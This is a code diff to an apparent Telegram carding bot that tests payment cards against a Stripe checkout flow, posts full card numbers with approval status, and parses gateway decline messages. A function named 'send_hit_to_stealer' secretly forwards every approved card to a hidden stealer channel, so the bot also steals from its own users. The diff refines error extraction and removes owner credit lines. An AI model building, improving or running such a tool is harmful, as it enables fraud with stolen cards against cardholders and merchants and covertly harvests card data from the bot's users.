@@ -40,7 +40,7 @@ async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_ta
 {SYMBOL} 𝗧𝗼𝗼𝗸 {time_taken:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
 {SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
 {SYMBOL} 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
-        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML")
+        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML", reply_markup=None)
     except Exception as e:
         print(f"[Stealer Error] {e}")
 
@@ -113,24 +113,41 @@ async def stripe_check(card):
             logging.error(f"Setup Intent confirm post error: {e}")
             resp_json = {"success": False, "data": {}}
 
-        status = "Declined ❌"
-        text_resp = "Card Declined ❌"
-
-        # Check status
+        # Determine status and extract actual message
         if resp_json.get("success") and resp_json.get("data", {}).get("status") == "succeeded":
             status = "Approved ✅"
-            text_resp = "Your Card Successful ✅"
+            # Try to get a meaningful success message
+            text_resp = resp_json.get("data", {}).get("status", "Payment method saved")
         else:
+            status = "Declined ❌"
+            # Extract actual error from response
             try:
-                resp_text = resp.text.lower()
-                if 'card was declined' in resp_text:
-                    text_resp = "Card Declined ❌"
-                elif 'your card number is incorrect.' in resp_text:
-                    text_resp = "Card Number Incorrect ❌"
-                elif 'your card\'s security code is incorrect' in resp_text:
-                    text_resp = "Security Code Incorrect ❌"
+                # First, check if there's an error in the JSON response
+                if "data" in resp_json and "error" in resp_json["data"]:
+                    error = resp_json["data"]["error"]
+                    text_resp = error.get("message", "Transaction declined")
+                elif "errors" in resp_json:
+                    text_resp = resp_json["errors"][0].get("message", "Transaction declined")
+                else:
+                    # Fallback to looking in the raw response text
+                    resp_text = resp.text.lower()
+                    if "card was declined" in resp_text:
+                        text_resp = "Card was declined"
+                    elif "your card number is incorrect" in resp_text:
+                        text_resp = "Card number is incorrect"
+                    elif "security code is incorrect" in resp_text:
+                        text_resp = "Security code is incorrect"
+                    elif "insufficient funds" in resp_text:
+                        text_resp = "Insufficient funds"
+                    else:
+                        # Extract any error message from HTML if possible
+                        match = re.search(r'<div class="woocommerce-error">(.*?)</div>', resp.text, re.DOTALL)
+                        if match:
+                            text_resp = match.group(1).strip()
+                        else:
+                            text_resp = "Transaction declined"
             except:
-                pass
+                text_resp = "Transaction declined"
 
         return {"status": status, "text": text_resp, "bin": n[:6]}
 
@@ -209,14 +226,17 @@ async def stripe_cmd(Client, message):
         thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)
         await asyncio.sleep(0.5)
 
-        # Send to stealer if approved (minimal info)
+        # Send to stealer if approved
         if "Approved" in result['status'] or "✅" in result['status']:
             await send_hit_to_stealer(
                 Client, fullcc, result['status'], result['text'], gateway,
                 time.perf_counter() - start, message.from_user.first_name, role
             )
 
-        finalresp = f"""{result['status']}
+        # Make status bold
+        display_status = f"<b>{result['status']}</b>"
+
+        finalresp = f"""{display_status}
 
 {SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
 {SYMBOL} 𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ {result['text']}
@@ -228,8 +248,7 @@ async def stripe_cmd(Client, message):
 {SYMBOL} 𝗧𝘆𝗽𝗲 ⇾ {brand} | {type_} - {level}
 
 {SYMBOL} 𝗧𝗶𝗺𝗲 ⇾ {time.perf_counter() - start:.2f}s
-{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ {message.from_user.first_name} ({role})
-{SYMBOL} 𝗢𝘄𝗻𝗲𝗿 ⇾ <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ <a href='tg://user?id={user_id}'>{message.from_user.first_name}</a> ({role})"""
 
         await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
 
@@ -420,9 +439,10 @@ Checked by: {first_name} ({role})""",
     # Delete progress message
     await progress_msg.delete()
 
-    # Send each approved card separately (full details, no proxy/vbv)
+    # Send each approved card separately (full details, no Owner line)
     for card in approved_cards:
-        approved_msg = f"""{card['status']}
+        display_status = f"<b>{card['status']}</b>"
+        approved_msg = f"""{display_status}
 
 {SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
 {SYMBOL} 𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ {card['response']}
@@ -434,14 +454,13 @@ Checked by: {first_name} ({role})""",
 {SYMBOL} 𝗧𝘆𝗽𝗲 ⇾ {card['brand']}
 
 {SYMBOL} 𝗧𝗶𝗺𝗲 ⇾ {card['time']:.2f}s
-{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ {first_name} ({role})
-{SYMBOL} 𝗢𝘄𝗻𝗲𝗿 ⇾ <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
         await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
         await asyncio.sleep(0.5)
 
     elapsed_time = round(time.perf_counter() - start_time, 2)
 
-    # Send declined summary (without proxy/vbv)
+    # Send declined summary (no Owner line)
     if approved_count > 0:
         declined_summary = f"""❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 𝗖𝗮𝗿𝗱𝘀 ({declined_count})
 
@@ -458,10 +477,7 @@ Checked by: {first_name} ({role})""",
 ❌ Declined: {declined_count}
 📊 Total: {total_cards}
 ⏱ Time: {elapsed_time}s
-👤 Checked by: {first_name} ({role})
-
-━━━━━━━━━━━━━━━━━━━━
-<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+👤 Checked by: {first_name} ({role})"""
         await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
     else:
         await message.reply_text(
@@ -471,10 +487,7 @@ Checked by: {first_name} ({role})""",
 📊 Total Cards: {total_cards}
 ❌ All Declined: {declined_count}
 ⏱ Time: {elapsed_time}s
-👤 Checked by: {first_name} ({role})
-
-━━━━━━━━━━━━━━━━━━━━
-<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>""",
+👤 Checked by: {first_name} ({role})""",
             quote=True,
             parse_mode=enums.ParseMode.HTML
         )
